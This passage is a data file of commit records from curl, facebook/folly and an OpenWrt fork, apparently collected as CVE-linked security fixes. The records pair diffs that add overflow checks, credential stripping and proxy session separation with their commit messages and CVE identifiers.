    -      incache = !(Curl_ssl_getsessionid(data, conn, &old_ssl_sessionid, NULL,\n\
    -                                        sockindex));\n+      incache = !(Curl_ssl_getsessionid(data,\
    \ conn, isproxy,\n+                                        &old_ssl_sessionid,\
    \ NULL, sockindex));\n       if(incache) {\n         if(old_ssl_sessionid != our_ssl_sessionid)\
    \ {\n           infof(data, \"old SSL session ID is stale, removing\\n\");\n@@\
    \ -786,8 +789,8 @@ wolfssl_connect_step3(struct Curl_easy *data, struct connectdata\
    \ *conn,\n       }\n \n       if(!incache) {\n-        result = Curl_ssl_addsessionid(data,\
    \ conn, our_ssl_sessionid,\n-                                       0 /* unknown\
    \ size */, sockindex);\n+        result = Curl_ssl_addsessionid(data, conn, isproxy,\
    \ our_ssl_sessionid,\n+                                       0, sockindex);\n\
    \         if(result) {\n           Curl_ssl_sessionid_unlock(data);\n        \
    \   failf(data, \"failed to store ssl session\");"
  commit_message: 'vtls: add ''isproxy'' argument to Curl_ssl_get/addsessionid()


    To make sure we set and extract the correct session.


    Reported-by: Mingtao Yang

    Bug: https://curl.se/docs/CVE-2021-22890.html


    CVE-2021-22890'
  commit_sha: b09c8ee15771c614c4bf3ddac893cdb12187c844
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/transfer.c\n+++ b/lib/transfer.c\n@@ -1581,6 +1581,9 @@ CURLcode Curl_follow(struct\
    \ Curl_easy *data,\n       data->state.followlocation++; /* count location-followers\
    \ */\n \n       if(data->set.http_auto_referer) {\n+        CURLU *u;\n+     \
    \   char *referer;\n+\n         /* We are asked to automatically set the previous\
    \ URL as the referer\n            when we get the next URL. We pick the ->url\
    \ field, which may or may\n            not be 100% correct */\n@@ -1590,9 +1593,27\
    \ @@ CURLcode Curl_follow(struct Curl_easy *data,\n           data->state.referer_alloc\
    \ = FALSE;\n         }\n \n-        data->state.referer = strdup(data->state.url);\n\
    -        if(!data->state.referer)\n+        /* Make a copy of the URL without\
    \ crenditals and fragment */\n+        u = curl_url();\n+        if(!u)\n+   \
    \       return CURLE_OUT_OF_MEMORY;\n+\n+        uc = curl_url_set(u, CURLUPART_URL,\
    \ data->state.url, 0);\n+        if(!uc)\n+          uc = curl_url_set(u, CURLUPART_FRAGMENT,\
    \ NULL, 0);\n+        if(!uc)\n+          uc = curl_url_set(u, CURLUPART_USER,\
    \ NULL, 0);\n+        if(!uc)\n+          uc = curl_url_set(u, CURLUPART_PASSWORD,\
    \ NULL, 0);\n+        if(!uc)\n+          uc = curl_url_get(u, CURLUPART_URL,\
    \ &referer, 0);\n+\n+        curl_url_cleanup(u);\n+\n+        if(uc || referer\
    \ == NULL)\n           return CURLE_OUT_OF_MEMORY;\n+\n+        data->state.referer\
    \ = referer;\n         data->state.referer_alloc = TRUE; /* yes, free this later\
    \ */\n       }\n     }"
  commit_message: 'transfer: strip credentials from the auto-referer header field


    Added test 2081 to verify.


    CVE-2021-22876


    Bug: https://curl.se/docs/CVE-2021-22876.html'
  commit_sha: 7214288898f5625a6cc196e22a74232eada7861c
  repo_name: curl/curl
- commit_diff:
  - "--- a/package/utils/fritz-tools/src/fritz_tffs_nand_read.c\n+++ b/package/utils/fritz-tools/src/fritz_tffs_nand_read.c\n\
    @@ -73,21 +73,18 @@ static uint8_t readbuf[TFFS_SECTOR_SIZE];\n static uint8_t\
    \ oobbuf[TFFS_SECTOR_OOB_SIZE];\n static uint32_t blocksize;\n static int mtdfd;\n\
    -struct tffs_sectors *sectors;\n-\n-struct tffs_sectors {\n-\tuint32_t num_sectors;\n\
    -\tuint8_t sectors[0];\n-};\n+static uint32_t num_sectors;\n+static uint8_t *sectors;\n\
    +static uint32_t *sector_ids;\n \n static inline void sector_mark_bad(int num)\n\
    \ {\n-\tsectors->sectors[num / 8] &= ~(0x80 >> (num % 8));\n+\tsectors[num / 8]\
    \ &= ~(0x80 >> (num % 8));\n };\n \n static inline uint8_t sector_get_good(int\
    \ num)\n {\n-\treturn sectors->sectors[num / 8] & 0x80 >> (num % 8);\n+\treturn\
    \ sectors[num / 8] & 0x80 >> (num % 8);\n };\n \n struct tffs_entry_segment {\n\
    @@ -139,6 +136,8 @@ static int read_sector(off_t pos)\n \t\treturn -1;\n \t}\n\
    \ \n+\tsector_ids[pos / TFFS_SECTOR_SIZE] = read_uint32(readbuf, 0x00);\n+\n \t\
    return 0;\n }\n \n@@ -176,25 +175,39 @@ static int find_entry(uint32_t id, struct\
    \ tffs_entry *entry)\n \n \toff_t pos = 0;\n \tuint8_t block_end = 0;\n-\tfor\
    \ (uint32_t sector = 0; sector < sectors->num_sectors; sector++, pos += TFFS_SECTOR_SIZE)\
    \ {\n+\tfor (uint32_t sector = 0; sector < num_sectors; sector++, pos += TFFS_SECTOR_SIZE)\
    \ {\n \t\tif (block_end) {\n \t\t\tif (pos % blocksize == 0) {\n \t\t\t\tblock_end\
    \ = 0;\n \t\t\t}\n \t\t} else if (sector_get_good(sector)) {\n+\t\t\tif (sector_ids[sector])\
    \ {\n+\t\t\t\tif (sector_ids[sector] == TFFS_ID_END) {\n+\t\t\t\t\t/* no more\
    \ entries in this block */\n+\t\t\t\t\tblock_end = 1;\n+\t\t\t\t\tcontinue;\n\
    +\t\t\t\t}\n+\n+\t\t\t\tif (sector_ids[sector] != id)\n+\t\t\t\t\tcontinue;\n\
    +\t\t\t}\n+\n \t\t\tif (read_sectoroob(pos) || read_sector(pos)) {\n \t\t\t\t\
    fprintf(stderr, \"ERROR: sector isn't readable, but has been previously!\\n\"\
    );\n \t\t\t\texit(EXIT_FAILURE);\n \t\t\t}\n-\t\t\tuint32_t oob_id = read_uint32(oobbuf,\
    \ 0x02);\n-\t\t\tuint32_t oob_len = read_uint32(oobbuf, 0x06);\n-\t\t\tuint32_t\
    \ oob_rev = read_uint32(oobbuf, 0x0a);\n \t\t\tuint32_t read_id = read_uint32(readbuf,\
    \ 0x00);\n \t\t\tuint32_t read_len = read_uint32(readbuf, 0x04);\n \t\t\tuint32_t\
    \ read_rev = read_uint32(readbuf, 0x0c);\n-\t\t\tif (read_oob_sector_health &&\
    \ (oob_id != read_id || oob_len != read_len || oob_rev != read_rev)) {\n-\t\t\t\
    \tfprintf(stderr, \"Warning: sector has inconsistent metadata\\n\");\n-\t\t\t\t\
    continue;\n+\t\t\tif (read_oob_sector_health) {\n+\t\t\t\tuint32_t oob_id = read_uint32(oobbuf,\
    \ 0x02);\n+\t\t\t\tuint32_t oob_len = read_uint32(oobbuf, 0x06);\n+\t\t\t\tuint32_t\
    \ oob_rev = read_uint32(oobbuf, 0x0a);\n+\n+\t\t\t\tif (oob_id != read_id || oob_len\
    \ != read_len || oob_rev != read_rev) {\n+\t\t\t\t\tfprintf(stderr, \"Warning:\
    \ sector has inconsistent metadata\\n\");\n+\t\t\t\t\tcontinue;\n+\t\t\t\t}\n\
    \ \t\t\t}\n \t\t\tif (read_id == TFFS_ID_END) {\n \t\t\t\t/* no more entries in\
    \ this block */\n@@ -414,13 +427,14 @@ static int scan_mtd(void)\n \n \tblocksize\
    \ = info.erasesize;\n \n-\tsectors = malloc(sizeof(*sectors) + (info.size / TFFS_SECTOR_SIZE\
    \ + 7) / 8);\n-\tif (sectors == NULL) {\n+\tnum_sectors = info.size / TFFS_SECTOR_SIZE;\n\
    +\tsectors = malloc((num_sectors + 7) / 8);\n+\tsector_ids = calloc(num_sectors,\
    \ sizeof(uint32_t));\n+\tif (!sectors || !sector_ids) {\n \t\tfprintf(stderr,\
    \ \"ERROR: memory allocation failed!\\n\");\n \t\texit(EXIT_FAILURE);\n \t}\n\
    -\tsectors->num_sectors = info.size / TFFS_SECTOR_SIZE;\n-\tmemset(sectors->sectors,\
    \ 0xff, (info.size / TFFS_SECTOR_SIZE + 7) / 8);\n+\tmemset(sectors, 0xff, (num_sectors\
    \ + 7) / 8);\n \n \tuint32_t sector = 0, valid_blocks = 0;\n \tuint8_t block_ok\
    \ = 0;\n@@ -564,6 +578,7 @@ int main(int argc, char *argv[])\n out_free_entry:\n\
    \ \tfree(name_table.val);\n out_free_sectors:\n+\tfree(sector_ids);\n \tfree(sectors);\n\
    \ out_close:\n \tclose(mtdfd);"
  commit_message: "treewide: sync with upstream (#10658)\n\n* rules: fix broken commitcount\
    \ on alpine system\r\n\r\nTo generate commitcount we use grep --max-count. This\
    \ is not present on\r\nalpine grep and cause wrong generation. Use -m as it's\
    \ just the short\r\nversion of --max-count and more portable.\r\n\r\nFixes: #11200\r\
    \nSigned-off-by: Christian Marangi <ansuelsmth@gmail.com>\r\n\r\n* image-commands.mk:\
    \ Be consistent in command invocation\r\n\r\nMost/all other tools use the staging\
    \ dir prefix, gzip should as well.\r\n\r\nSigned-off-by: Olliver Schinagl <oliver@schinagl.nl>\r\
    \nAcked-by: Christian Marangi <ansuelsmth@gmail.com>\r\n\r\n* image: fix device\
    \ profile specific COMPILE targets\r\n\r\nCommit a01d23e75 (\"image: always rebuild\
    \ kernel loaders\")\r\nis a step in the right direction, but exposed some issues\r\
    \nand regressions in the makefile.\r\n\r\nSome of the files made by device specific\
    \ COMPILE targets\r\nstart with an \"append\" command (i.e. >> instead of > redirection)\r\
    \nand if the file already exists, the target file is the\r\ninput to itself before\
    \ the first recipe-specified input.\r\n\r\nFixes: a01d23e75 (\"image: always rebuild\
    \ kernel loaders\")\r\nFixes: a7fb589e8 (\"image: always rebuild kernel loaders\"\
    )\r\nSigned-off-by: Michael Pratt <mcpratt@pm.me>\r\n\r\n* trusted-firmware-a.mk:\
    \ use correct CPE ID\r\n\r\nThere are 2 different CPE IDs on the NVD website:\r\
    \ncpe:/a:arm:trusted_firmware-a\r\ncpe:/o:arm:arm_trusted_firmware\r\n\r\nThe\
    \ ID as currently used in trusted-firmware-a.mk does not exist. The\r\nCPE ID\
    \ using the arm_trusted_firmware product name only lists a few\r\nrecords for\
    \ versions 2.2 and 2.3 on the NVD site. The CPE ID using the\r\ntrusted_firmware-a\
    \ product name lists many more records, and actually\r\nhas a CVE linked to it.\
    \ Therefore, use the CPE ID using the\r\ntrusted_firmware-a product name.\r\n\r\
    \nFixes: 104d60fe94ce (\"trusted-firmware-a.mk: add PKG_CPE_ID\")\r\nSigned-off-by:\
    \ Stijn Tintel <stijn@linux-ipv6.be>\r\n\r\n* fritz-tools: fritz_tffs_nand: exclude\
    \ oob code when disabled\r\n\r\nSkip unnecessary stuff if checking the oob data\
    \ is disabled.\r\n\r\nSigned-off-by: Andre Heider <a.heider@gmail.com>\r\n\r\n\
    * fritz-tools: fritz_tffs_nand: get rid of struct tffs_sectors\r\n\r\nThis doesn't\
    \ help and \"[0]\" gets in the way of bounds checks.\r\n\r\nSigned-off-by: Andre\
    \ Heider <a.heider@gmail.com>\r\n\r\n* fritz-tools: fritz_tffs_nand: cache already\
    \ read sector ids\r\n\r\nThis speeds up the tool significantly, especially when\
    \ using the \"-a\"\r\nargument.\r\n\r\nSigned-off-by: Andre Heider <a.heider@gmail.com>\r\
    \n\r\n* iproute2: add missing libbpf dependency\r\n\r\nThis patch adds libbpf\
    \ to the dependencies of tc-mod-iptables.\r\n\r\nThe package tc-mod-iptables is\
    \ missing libbpf as a dependency,\r\nwhich leads to the build failure described\
    \ in bug #9491\r\n\r\n    LIBBPF_FORCE=on set, but couldn't find a usable libbpf\r\
    \n\r\nThe build dependency is already automatically added because some other\r\
    \npackages from iproute2 depend on libbpf, but bpftools has multiple build\r\n\
    variants. With multiple build variants none gets build by default and\r\nthe build\
    \ system will not build bpftools before iproute2.\r\n\r\nFixes: #9491\r\nSigned-off-by:\
    \ Kien Truong <duckientruong@gmail.com>\r\nSigned-off-by: Hauke Mehrtens <hauke@hauke-m.de>\r\
    \n\r\n* iproute2: update to 6.0.0\r\n\r\nRelease Notes:\r\nhttps://lore.kernel.org/netdev/20221004082610.56b04719@hermes.local/t/\r\
    \n\r\nRemove upstreamed patch:\r\n- 010-ipstats-Add-param.h-for-musl.patch\r\n\
    \r\nRefreshed:\r\n- 140-keep_libmnl_optional.patch\r\n- 145-keep_libelf_optional.patch\r\
    \n- 150-keep_libcap_optional.patch\r\n- 155-keep_tirpc_optional.patch\r\n- 170-ip_tiny.patch\r\
    \n- 190-fix-nls-rpath-link.patch\r\n- 200-drop_libbsd_dependency.patch\r\n- 300-selinux-configurable.patch\r\
    \n\r\nSigned-off-by: Nick Hainke <vincent@systemli.org>\r\n\r\n* iproute2: update\
    \ to 6.1.0\r\n\r\nAnnouncement:\r\nhttps://lore.kernel.org/netdev/20221214094130.7b11ec2e@hermes.local/T/#t\r\
    \n\r\nRefresh patch:\r\n- 170-ip_tiny.patch\r\n\r\nSigned-off-by: Nick Hainke\
    \ <vincent@systemli.org>\r\n\r\n* tools/xz: update to 5.2.10\r\n\r\nUpdate to\
    \ latest version.\r\n\r\nSigned-off-by: Nick Hainke <vincent@systemli.org>\r\n\
    \r\n* Revert \"Revert \"tools/upx: remove (#10622)\"\"\r\n\r\nThis reverts commit\
    \ d3e16f203a8d238ebcf8d40e7453e8b375248e08.\r\n\r\n* kernel: Make use of KERNEL_MAKE\r\
    \n\r\nMake use of KERNEL_MAKE in kernel packages were easily possible.\r\nThis\
    \ moves some more code to common places and reduces the number of\r\nlines.\r\n\
    \r\nIt is defined like this:\r\nKERNEL_MAKE = $(MAKE) $(KERNEL_MAKEOPTS)\r\nKERNEL_MAKEOPTS\
    \ = -C $(LINUX_DIR) $(KERNEL_MAKE_FLAGS)\r\n\r\nSigned-off-by: Hauke Mehrtens\
    \ <hauke@hauke-m.de>\r\n\r\n* toolchain: gcc: backport patches to fix build with\
    \ glibc 2.36\r\n\r\nglibc 2.36 changed the definition of enum fsconfig_command,\
    \ it now\r\ncollides with the same definition from sys/mount.h. Remove the include\r\
    \nof linux/fs.h This still compiled with musl too.\r\n\r\nThis backports a patch\
    \ which is already in the stable branch of GCC 11\r\nand GCC 12.\r\n\r\nSigned-off-by:\
    \ Hauke Mehrtens <hauke@hauke-m.de>\r\n\r\n* toolchain: glibc: Update to glibc\
    \ 2.36\r\n\r\nThis updates to glibc to version 2.36.\r\n\r\nSigned-off-by: Hauke\
    \ Mehrtens <hauke@hauke-m.de>\r\n\r\n* tools/llvm: update to 15.0.6\r\n\r\nRelease\
    \ Notes:\r\n\thttps://discourse.llvm.org/t/llvm-15-0-0-release/65099\r\n\thttps://discourse.llvm.org/t/llvm-15-0-1-released/65380\r\
    \n\thttps://discourse.llvm.org/t/llvm-15-0-2-released/65695\r\n\thttps://discourse.llvm.org/t/llvm-15-0-3-released/66036\r\
    \n\thttps://discourse.llvm.org/t/llvm-15-0-4-released/66337\r\n\thttps://discourse.llvm.org/t/llvm-15-0-5-release/66616\r\
    \n\thttps://discourse.llvm.org/t/llvm-15-0-6-released/66899\r\n\r\nRemove HOST_BUILD_PARALLEL\
    \ as it's default now.\r\n\r\nSigned-off-by: Linhui Liu <liulinhui36@gmail.com>\r\
    \n\r\nSigned-off-by: Christian Marangi <ansuelsmth@gmail.com>\r\nSigned-off-by:\
    \ Olliver Schinagl <oliver@schinagl.nl>\r\nSigned-off-by: Michael Pratt <mcpratt@pm.me>\r\
    \nSigned-off-by: Stijn Tintel <stijn@linux-ipv6.be>\r\nSigned-off-by: Andre Heider\
    \ <a.heider@gmail.com>\r\nSigned-off-by: Kien Truong <duckientruong@gmail.com>\r\
    \nSigned-off-by: Hauke Mehrtens <hauke@hauke-m.de>\r\nSigned-off-by: Nick Hainke\
    \ <vincent@systemli.org>\r\nSigned-off-by: Linhui Liu <liulinhui36@gmail.com>\r\
    \nCo-authored-by: Christian Marangi <ansuelsmth@gmail.com>\r\nCo-authored-by:\
    \ Olliver Schinagl <oliver@schinagl.nl>\r\nCo-authored-by: Michael Pratt <mcpratt@pm.me>\r\
    \nCo-authored-by: Stijn Tintel <stijn@linux-ipv6.be>\r\nCo-authored-by: Andre\
    \ Heider <a.heider@gmail.com>\r\nCo-authored-by: Kien Truong <duckientruong@gmail.com>\r\
    \nCo-authored-by: Nick Hainke <vincent@systemli.org>\r\nCo-authored-by: Hauke\
    \ Mehrtens <hauke@hauke-m.de>"
  commit_sha: d2460dfb82ae1ee2a41a20bfe479f216056c2dcc
  repo_name: coolsnowwolf/lede
- commit_diff:
  - "--- a/target/linux/ath79/files/drivers/net/ethernet/atheros/ag71xx/ag71xx_main.c\n\
    +++ b/target/linux/ath79/files/drivers/net/ethernet/atheros/ag71xx/ag71xx_main.c\n\
    @@ -1214,14 +1214,22 @@ static int ag71xx_rx_packets(struct ag71xx *ag, int limit)\n\
    \ \tunsigned int offset = ag->rx_buf_offset;\n \tint ring_mask = BIT(ring->order)\
    \ - 1;\n \tint ring_size = BIT(ring->order);\n+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,19,0))\n\
    +\tstruct list_head rx_list;\n+\tstruct sk_buff *next;\n+#else\n \tstruct sk_buff_head\
    \ queue;\n+#endif\n \tstruct sk_buff *skb;\n \tint done = 0;\n \n \tDBG(\"%s:\
    \ rx packets, limit=%d, curr=%u, dirty=%u\\n\",\n \t\t\tdev->name, limit, ring->curr,\
    \ ring->dirty);\n-\n+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,19,0))\n+\tINIT_LIST_HEAD(&rx_list);\n\
    +#else\n \tskb_queue_head_init(&queue);\n+#endif\n \n \twhile (done < limit) {\n\
    \ \t\tunsigned int i = ring->curr & ring_mask;\n@@ -1263,7 +1271,11 @@ static\
    \ int ag71xx_rx_packets(struct ag71xx *ag, int limit)\n \t\t} else {\n \t\t\t\
    skb->dev = dev;\n \t\t\tskb->ip_summed = CHECKSUM_NONE;\n+#if (LINUX_VERSION_CODE\
    \ >= KERNEL_VERSION(4,19,0))\n+\t\t\tlist_add_tail(&skb->list, &rx_list);\n+#else\n\
    \ \t\t\t__skb_queue_tail(&queue, skb);\n+#endif\n \t\t}\n \n next:\n@@ -1275,10\
    \ +1287,16 @@ static int ag71xx_rx_packets(struct ag71xx *ag, int limit)\n \n\
    \ \tag71xx_ring_rx_refill(ag);\n \n+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,19,0))\n\
    +\tlist_for_each_entry_safe(skb, next, &rx_list, list)\n+\t\tskb->protocol = eth_type_trans(skb,\
    \ dev);\n+\tnetif_receive_skb_list(&rx_list);\n+#else\n \twhile ((skb = __skb_dequeue(&queue))\
    \ != NULL) {\n \t\tskb->protocol = eth_type_trans(skb, dev);\n \t\tnetif_receive_skb(skb);\n\
    \ \t}\n+#endif\n \n \tDBG(\"%s: rx finish, curr=%u, dirty=%u, done=%d\\n\",\n\
    \ \t\tdev->name, ring->curr, ring->dirty, done);"
  commit_message: "kernel: bump to 4.9.214, 4.14.171, 4.19.106 (#3318)\n\n* kernel:\
    \ bump 4.14 to 4.14.171\r\n\r\nRefreshed all patches.\r\n\r\nFixes:\r\n- CVE-2013-1798\r\
    \n\r\nCompile-tested on: cns3xxx\r\nRuntime-tested on: cns3xxx\r\n\r\nSigned-off-by:\
    \ Koen Vandeputte <koen.vandeputte@ncentric.com>\r\n\r\n* kernel: bump 4.19 to\
    \ 4.19.105\r\n\r\nRefreshed all patches.\r\n\r\nFixes:\r\n- CVE-2013-1798\r\n\
    - CVE-2019-3016\r\n\r\nCompile-tested on: cns3xxx\r\nRuntime-tested on: cns3xxx\r\
    \n\r\nSigned-off-by: Koen Vandeputte <koen.vandeputte@ncentric.com>\r\n\r\n* kernel:\
    \ bump 4.19 to 4.19.106\r\n\r\nRefreshed all patches.\r\n\r\nRemove upstreamed:\r\
    \n- 950-0786-leds-pca963x-Fix-open-drain-initialization.patch\r\n\r\nCompile-tested\
    \ on: cns3xxx\r\nRuntime-tested on: cns3xxx\r\n\r\nSigned-off-by: Koen Vandeputte\
    \ <koen.vandeputte@ncentric.com>\r\n\r\n* kernel: bump to 4.9.214, 4.14.171, 4.19.106\r\
    \n\r\nCo-authored-by: Koen Vandeputte <koen.vandeputte@ncentric.com>"
  commit_sha: 01ab5cf3c9bb13d7fcd5884ada8670fa427a069c
  repo_name: coolsnowwolf/lede
- commit_diff:
  - "--- a/folly/io/IOBuf.cpp\n+++ b/folly/io/IOBuf.cpp\n@@ -287,7 +287,22 @@ IOBuf::IOBuf(\n\
    \     std::size_t size,\n     std::size_t headroom,\n     std::size_t minTailroom)\n\
    -    : IOBuf(CREATE, headroom + size + minTailroom) {\n+    : next_(this),\n+\
    \      prev_(this),\n+      data_(nullptr),\n+      length_(0),\n+      flagsAndSharedInfo_(0)\
    \ {\n+  std::size_t capacity = 0;\n+  if (!checked_add(&capacity, size, headroom,\
    \ minTailroom) ||\n+      capacity > kMaxIOBufSize) {\n+    throw_exception<std::bad_alloc>();\n\
    +  }\n+\n+  SharedInfo* info;\n+  allocExtBuffer(capacity, &buf_, &info, &capacity_);\n\
    +  setSharedInfo(info);\n+  data_ = buf_;\n+\n   advance(headroom);\n   if (size\
    \ > 0) {\n     assert(buf != nullptr);"
  - "--- a/folly/io/test/IOBufTest.cpp\n+++ b/folly/io/test/IOBufTest.cpp\n@@ -1832,3\
    \ +1832,15 @@ TEST(IOBuf, bufferTooLarge) {\n       IOBuf::copyBuffer(StringPiece(\"\
    Hello\"), (size_t)0xFFFF'FFFF'FFFF'FFFE),\n       std::length_error);\n }\n+\n\
    +TEST(IOBuf, copyConstructBufferTooLarge) {\n+  auto buf = StringPiece(\"Hello\"\
    );\n+  EXPECT_THROW(\n+      IOBuf(\n+          IOBuf::COPY_BUFFER,\n+       \
    \   buf.data(),\n+          buf.size(),\n+          57,\n+          (size_t)0xFFFF'FFFF'FFFF'FFFE),\n\
    +      std::bad_alloc);\n+}"
  commit_message: 'Add additional checking when constructing an IOBuf with explicit
    headroom and tailroom - CVE-2022-35647


    Summary: As per title.


    Reviewed By: Gownta


    Differential Revision: D37732131


    fbshipit-source-id: a0d9076df02bb219f6ceb6fdb01e1b6bdf322c4e'
  commit_sha: 43f8d7ce8f0434a3e071d02e88f8214bf2847fe6
  repo_name: facebook/folly
- commit_diff:
  - "--- a/folly/io/IOBuf.cpp\n+++ b/folly/io/IOBuf.cpp\n@@ -23,6 +23,7 @@\n #include\
    \ <cassert>\n #include <cstdint>\n #include <cstdlib>\n+#include <limits>\n #include\
    \ <stdexcept>\n \n #include <folly/Conv.h>\n@@ -32,6 +33,7 @@\n #include <folly/hash/SpookyHashV2.h>\n\
    \ #include <folly/io/Cursor.h>\n #include <folly/lang/Align.h>\n+#include <folly/lang/CheckedMath.h>\n\
    \ #include <folly/lang/Exception.h>\n #include <folly/memory/Malloc.h>\n #include\
    \ <folly/memory/SanitizeAddress.h>\n@@ -84,7 +86,8 @@ enum : std::size_t {\n \
    \  // benchmarks of real applications to see if adjusting this number makes a\n\
    \   // difference.  Callers that know their exact use case can also explicitly\n\
    \   // call createCombined() or createSeparate().)\n-  kDefaultCombinedBufSize\
    \ = 1024\n+  kDefaultCombinedBufSize = 1024,\n+  kMaxIOBufSize = std::numeric_limits<size_t>::max()\
    \ >> 1,\n };\n \n // Helper function for IOBuf::takeOwnership()\n@@ -187,6 +190,9\
    \ @@ void IOBuf::SharedInfo::releaseStorage(SharedInfo* info) noexcept {\n }\n\
    \ \n void* IOBuf::operator new(size_t size) {\n+  if (size > kMaxIOBufSize) {\n\
    +    throw_exception<std::bad_alloc>();\n+  }\n   size_t fullSize = offsetof(HeapStorage,\
    \ buf) + size;\n   auto storage = static_cast<HeapStorage*>(checkedMalloc(fullSize));\n\
    \ \n@@ -297,6 +303,10 @@ IOBuf::IOBuf(\n     : IOBuf(op, br.data(), br.size(),\
    \ headroom, minTailroom) {}\n \n unique_ptr<IOBuf> IOBuf::create(std::size_t capacity)\
    \ {\n+  if (capacity > kMaxIOBufSize) {\n+    throw_exception<std::bad_alloc>();\n\
    +  }\n+\n   // For smaller-sized buffers, allocate the IOBuf, SharedInfo, and\
    \ the buffer\n   // all with a single allocation.\n   //\n@@ -328,6 +338,10 @@\
    \ unique_ptr<IOBuf> IOBuf::create(std::size_t capacity) {\n }\n \n unique_ptr<IOBuf>\
    \ IOBuf::createCombined(std::size_t capacity) {\n+  if (capacity > kMaxIOBufSize)\
    \ {\n+    throw_exception<std::bad_alloc>();\n+  }\n+\n   // To save a memory\
    \ allocation, allocate space for the IOBuf object, the\n   // SharedInfo struct,\
    \ and the data itself all with a single call to malloc().\n   size_t requiredStorage\
    \ = offsetof(HeapFullStorage, align) + capacity;\n@@ -456,6 +470,10 @@ unique_ptr<IOBuf>\
    \ IOBuf::takeOwnership(\n     void* userData,\n     bool freeOnError,\n     TakeOwnershipOption\
    \ option) {\n+  if (capacity > kMaxIOBufSize) {\n+    throw_exception<std::bad_alloc>();\n\
    +  }\n+\n   // do not allow only user data without a freeFn\n   // since we use\
    \ that for folly::sizedFree\n \n@@ -1006,8 +1024,13 @@ void IOBuf::decrementRefcount()\
    \ noexcept {\n }\n \n void IOBuf::reserveSlow(std::size_t minHeadroom, std::size_t\
    \ minTailroom) {\n-  size_t newCapacity = (size_t)length_ + minHeadroom + minTailroom;\n\
    -  DCHECK_LT(newCapacity, UINT32_MAX);\n+  size_t newCapacity = length_;\n+  if\
    \ (!checked_add(&newCapacity, newCapacity, minHeadroom) ||\n+      !checked_add(&newCapacity,\
    \ newCapacity, minTailroom) ||\n+      newCapacity > kMaxIOBufSize) {\n+    //\
    \ overflow\n+    throw_exception<std::bad_alloc>();\n+  }\n \n   // reserveSlow()\
    \ is dangerous if anyone else is sharing the buffer, as we may\n   // reallocate\
    \ and free the original buffer.  It should only ever be called if\n@@ -1158,6\
    \ +1181,10 @@ void IOBuf::allocExtBuffer(\n     uint8_t** bufReturn,\n     SharedInfo**\
    \ infoReturn,\n     std::size_t* capacityReturn) {\n+  if (minCapacity > kMaxIOBufSize)\
    \ {\n+    throw_exception<std::bad_alloc>();\n+  }\n+\n   size_t mallocSize =\
    \ goodExtBufferSize(minCapacity);\n   auto buf = static_cast<uint8_t*>(checkedMalloc(mallocSize));\n\
    \   initExtBuffer(buf, mallocSize, infoReturn, capacityReturn);\n@@ -1173,6 +1200,10\
    \ @@ void IOBuf::allocExtBuffer(\n }\n \n size_t IOBuf::goodExtBufferSize(std::size_t\
    \ minCapacity) {\n+  if (minCapacity > kMaxIOBufSize) {\n+    throw_exception<std::bad_alloc>();\n\
    +  }\n+\n   // Determine how much space we should allocate.  We'll store the SharedInfo\n\
    \   // for the external buffer just after the buffer itself.  (We store it just\n\
    \   // after the buffer rather than just before so that the code can still just"
  commit_message: '[folly] Add additional overflow checks to IOBuf - CVE-2021-24036


    Summary:

    As per title


    CVE-2021-24036


    Reviewed By: jan


    Differential Revision: D27938605


    fbshipit-source-id: 7481c54ae6fbb7b67b15b3631d5357c2f7043f9c'
  commit_sha: 4f304af1411e68851bdd00ef6140e9de4616f7d3
  repo_name: facebook/folly
- commit_diff:
  - "--- a/folly/io/async/AsyncSSLSocket.cpp\n+++ b/folly/io/async/AsyncSSLSocket.cpp\n\
    @@ -1450,9 +1450,6 @@ AsyncSocket::WriteResult AsyncSSLSocket::interpretSSLError(int\
    \ rc, int error) {\n         WRITE_ERROR,\n         std::make_unique<SSLException>(SSLError::INVALID_RENEGOTIATION));\n\
    \   } else {\n-    if (zero_return(error, rc, errno)) {\n-      return WriteResult(0);\n\
    -    }\n     auto errError = ERR_get_error();\n     VLOG(3) << \"ERROR: AsyncSSLSocket(fd=\"\
    \ << fd_ << \", state=\" << int(state_)\n             << \", sslState=\" << sslState_\
    \ << \", events=\" << eventFlags_ << \"): \"\n@@ -1589,10 +1586,7 @@ AsyncSocket::WriteResult\
    \ AsyncSSLSocket::performWrite(\n         *partialWritten = uint32_t(offset);\n\
    \         return WriteResult(totalWritten);\n       }\n-      auto writeResult\
    \ = interpretSSLError(int(bytes), error);\n-      if (writeResult.writeReturn\
    \ < 0) {\n-        return writeResult;\n-      } // else fall through to below\
    \ to correctly record totalWritten\n+      return interpretSSLError(int(bytes),\
    \ error);\n     }\n \n     totalWritten += bytes;"
  - "--- a/folly/io/async/test/AsyncSSLSocketTest.cpp\n+++ b/folly/io/async/test/AsyncSSLSocketTest.cpp\n\
    @@ -808,6 +808,114 @@ TEST(AsyncSSLSocketTest, SSLClientTimeoutTest) {\n   cerr\
    \ << \"SSLClientTimeoutTest test completed\" << endl;\n }\n \n+class PerLoopReadCallback\
    \ : public AsyncTransportWrapper::ReadCallback {\n+ public:\n+  void getReadBuffer(void**\
    \ bufReturn, size_t* lenReturn) override {\n+    *bufReturn = buf_.data();\n+\
    \    *lenReturn = buf_.size();\n+  }\n+\n+  void readDataAvailable(size_t len)\
    \ noexcept override {\n+    VLOG(3) << \"Read of size: \" << len;\n+    s_->setReadCB(nullptr);\n\
    +    s_->getEventBase()->runInLoop([this]() { s_->setReadCB(this); });\n+  }\n\
    +\n+  void readErr(const AsyncSocketException&) noexcept override {}\n+\n+  void\
    \ readEOF() noexcept override {}\n+\n+  void setSocket(AsyncSocket* s) {\n+  \
    \  s_ = s;\n+  }\n+\n+ private:\n+  AsyncSocket* s_;\n+  std::array<uint8_t, 1000>\
    \ buf_;\n+};\n+\n+class CloseNotifyConnector : public AsyncSocket::ConnectCallback\
    \ {\n+ public:\n+  CloseNotifyConnector(EventBase* evb, const SocketAddress& addr)\
    \ {\n+    evb_ = evb;\n+    ssl_ = AsyncSSLSocket::newSocket(std::make_shared<SSLContext>(),\
    \ evb_);\n+    ssl_->connect(this, addr);\n+  }\n+\n+  void connectSuccess() noexcept\
    \ override {\n+    ssl_->writeChain(nullptr, IOBuf::copyBuffer(\"hi\"));\n+  \
    \  auto ssl = const_cast<SSL*>(ssl_->getSSL());\n+    SSL_shutdown(ssl);\n+  \
    \  auto fd = ssl_->detachNetworkSocket();\n+    tcp_.reset(new AsyncSocket(evb_,\
